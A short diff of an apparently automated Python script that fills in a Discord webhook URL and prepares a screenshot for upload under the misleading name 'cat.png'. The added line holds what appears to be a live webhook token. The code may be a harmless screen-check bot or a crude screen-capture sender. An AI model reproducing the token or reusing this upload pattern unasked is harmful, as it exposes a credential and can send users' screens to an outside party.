@@ -1,7 +1,7 @@
 import pyautogui
 import time
 from dhooks import Webhook , File
-gg = Webhook('')
+gg = Webhook('https://discord.com/api/webhooks/1210688142496235640/3qnfG6w2x5MjMFQnW0cGXJBhD4YjW0FGPc7awIKAqz9nARafBucS-S1rwILLHiirx1Tr')
 # Define the coordinates you want to check
 # Open the file and pass the file object
 file = File('screenshots/screenshot_1.png', name='cat.png')  # optional name for discord
